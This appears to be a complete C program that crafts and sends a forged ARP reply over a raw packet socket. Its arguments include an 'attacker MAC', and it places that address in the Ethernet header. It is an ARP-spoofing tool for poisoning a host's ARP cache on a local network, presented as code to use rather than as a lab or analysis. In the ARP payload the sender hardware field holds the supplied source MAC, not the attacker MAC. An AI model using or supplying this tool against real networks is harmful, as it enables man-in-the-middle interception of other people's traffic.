#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <unistd.h>
#include <arpa/inet.h>

int parse_mac(const char* str, unsigned char* bytes) {
    int values[6];
    if (6 == sscanf(str, "%x:%x:%x:%x:%x:%x",
                    &values[0], &values[1], &values[2],
                    &values[3], &values[4], &values[5])) {
        for (int i = 0; i < 6; ++i) {
            bytes[i] = (unsigned char)values[i];
        }
        return 0;
    }
    return -1;
}

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr, "Usage: %s <iface> <source IP> <source MAC> <dest IP> <dest MAC> <attacker MAC>\n", argv[0]);
        return -1;
    }

    const char *iface     = argv[1];
    const char *src_ip_str  = argv[2];
    const char *src_mac_str = argv[3];
    const char *dst_ip_str  = argv[4];
    const char *dst_mac_str = argv[5];
    const char *att_mac_str = argv[6];

    unsigned char src_mac[6], dst_mac[6], att_mac[6];
    if (parse_mac(src_mac_str, src_mac) != 0 ||
        parse_mac(dst_mac_str, dst_mac) != 0 ||
        parse_mac(att_mac_str, att_mac) != 0) {
        fprintf(stderr, "Invalid MAC address format\n");
        return -2;
    }

    struct in_addr src_ip, dst_ip;
    if (inet_pton(AF_INET, src_ip_str, &src_ip) != 1 ||
        inet_pton(AF_INET, dst_ip_str, &dst_ip) != 1) {
        fprintf(stderr, "Invalid IP address\n");
        return -3;
    }

    int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        perror("socket");
        return -4;
    }

    int ifindex = if_nametoindex(iface);
    if (ifindex == 0) {
        perror("if_nametoindex");
        close(sock);
        return -5;
    }

    /* Build ARP reply payload */
    struct ether_arp arp;
    arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp.ea_hdr.ar_hln = ETHER_ADDR_LEN;
    arp.ea_hdr.ar_pln = sizeof(in_addr_t);
    arp.ea_hdr.ar_op  = htons(ARPOP_REPLY);
    memcpy(arp.arp_sha, src_mac, sizeof(arp.arp_sha));
    memcpy(&arp.arp_spa, &src_ip, sizeof(src_ip));
    memcpy(arp.arp_tha, dst_mac, sizeof(arp.arp_tha));
    memcpy(&arp.arp_tpa, &dst_ip, sizeof(dst_ip));

    /* Build Ethernet header */
    struct ether_header eh;
    memcpy(eh.ether_shost, att_mac, sizeof(eh.ether_shost));
    memcpy(eh.ether_dhost, dst_mac, sizeof(eh.ether_dhost));
    eh.ether_type = htons(ETH_P_ARP);

    /* Prepare socket address */
    struct sockaddr_ll sa = {0};
    sa.sll_family   = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex  = ifindex;
    sa.sll_halen    = ETH_ALEN;
    memcpy(sa.sll_addr, dst_mac, ETH_ALEN);

    /* Combine headers + ARP payload */
    unsigned char buffer[sizeof(eh) + sizeof(arp)];
    memcpy(buffer, &eh, sizeof(eh));
    memcpy(buffer + sizeof(eh), &arp, sizeof(arp));

    /* Send the packet */
    if (sendto(sock, buffer, sizeof(buffer), 0,
               (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto");
        close(sock);
        return -6;
    }

    close(sock);
    return 0;
}